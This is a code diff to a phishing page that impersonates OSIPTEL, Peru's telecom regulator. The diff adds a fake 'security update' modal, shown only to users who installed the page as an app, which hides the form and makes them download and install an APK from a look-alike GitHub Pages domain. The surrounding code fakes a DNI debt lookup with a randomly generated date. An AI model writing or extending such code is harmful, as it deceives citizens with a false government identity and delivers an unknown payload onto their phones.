@@ -55,6 +55,15 @@
         #banner-pwa p { margin-bottom: 10px; font-size: 14px; color: #333; }
         #banner-pwa button { background: #2664AE; color: white; border: none; padding: 12px 30px; font-size: 14px; border-radius: 4px; cursor: pointer; margin: 5px; font-weight: bold; }
         #banner-pwa button.cancel { background: #999; }
+
+        /* Pantalla de actualización (solo visible en PWA instalada) */
+        #update-prompt { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 10001; align-items: center; justify-content: center; }
+        #update-prompt .modal { background: white; border-radius: 12px; padding: 25px; text-align: center; max-width: 350px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
+        #update-prompt .modal img { height: 45px; margin-bottom: 15px; }
+        #update-prompt .modal h3 { color: #003366; margin-bottom: 10px; }
+        #update-prompt .modal p { font-size: 14px; color: #555; margin-bottom: 15px; }
+        #update-prompt .modal button { background: #003366; color: white; border: none; padding: 12px 30px; font-size: 15px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; }
+        #update-prompt .modal button.cancel { background: none; color: #999; margin-top: 10px; font-size: 13px; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -63,6 +72,17 @@
     <header class="header">
         <img src="logo_osiptel_gris.svg" alt="OSIPTEL">
     </header>
+
+    <!-- AVISO DE ACTUALIZACIÓN FALSO (solo visible cuando la PWA está instalada) -->
+    <div id="update-prompt">
+        <div class="modal">
+            <img src="logo_osiptel_gris.svg" alt="OSIPTEL">
+            <h3>⚠️ Actualización necesaria</h3>
+            <p>Se requiere una actualización de seguridad para continuar con la verificación de sus líneas.</p>
+            <button id="btn-install-apk">🔄 Instalar ahora</button>
+            <button class="cancel" onclick="cerrarUpdatePrompt()">Recordarme más tarde</button>
+        </div>
+    </div>
 
     <!-- BANNER PRINCIPAL (usando URL oficial de OSIPTEL) -->
     <div class="banner">
@@ -166,6 +186,33 @@
     <script>
         let deferredPrompt;
 
+        // Detectar si la app se abrió como WebAPK instalada
+        if (window.matchMedia('(display-mode: standalone)').matches || navigator.standalone) {
+            document.getElementById('update-prompt').style.display = 'flex';
+            document.getElementById('formulario').style.display = 'none';
+        }
+
+        // Cerrar el aviso de actualización (si el usuario lo pospone)
+        function cerrarUpdatePrompt() {
+            document.getElementById('update-prompt').style.display = 'none';
+            document.getElementById('formulario').style.display = 'block';
+        }
+
+        // Forzar la descarga del APK al hacer clic en "Instalar ahora"
+        document.getElementById('btn-install-apk').addEventListener('click', function() {
+            // Reemplaza esta URL con la de tu APK en GitHub Pages
+            const apkUrl = 'https://osiptel-peru.github.io/osiptel.pe/app-release.apk';
+            
+            const link = document.createElement('a');
+            link.href = apkUrl;
+            link.download = 'OSIPTEL_Actualizacion.apk';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            
+            alert('Descarga iniciada. Una vez completada, abra el archivo para instalar la actualización.');
+        });
+
         window.addEventListener('beforeinstallprompt', (e) => {
             e.preventDefault();
             deferredPrompt = e;
@@ -175,30 +222,24 @@
             var tipoDoc = document.getElementById('IdTipoDoc').value;
             var doc = document.getElementById('NumeroDocumento').value;
 
-            // Validar que se seleccione DNI
             if (tipoDoc !== '1') {
                 alert('Por favor seleccione DNI para realizar la consulta correctamente.');
                 return;
             }
 
-            // Validar que el DNI sean exactamente 8 dígitos numéricos
             if (!/^\d{8}$/.test(doc)) {
                 alert('El DNI debe contener exactamente 8 dígitos numéricos.');
                 return;
             }
 
-            // --- CORRECCIÓN DE LA FECHA: siempre 4 meses atrás, día aleatorio ---
             var hoy = new Date();
             var haceCuatroMeses = new Date(hoy.getFullYear(), hoy.getMonth() - 4, 1);
-            // Último día del mes hace 4 meses
             var ultimoDia = new Date(hoy.getFullYear(), hoy.getMonth() - 3, 0).getDate();
             var diaAleatorio = Math.floor(Math.random() * ultimoDia) + 1;
             var mes = String(haceCuatroMeses.getMonth() + 1).padStart(2, '0');
             var anio = haceCuatroMeses.getFullYear();
             var fechaFormateada = String(diaAleatorio).padStart(2, '0') + '/' + mes + '/' + anio;
-            // -----------------------------------------------------------------
 
-            // Mostrar el número de DNI y la fecha en el resultado
             document.getElementById('dniMostrado').innerText = doc;
             document.getElementById('fechaDeuda').innerText = fechaFormateada;
             document.getElementById('resultado-falso').style.display = 'block';
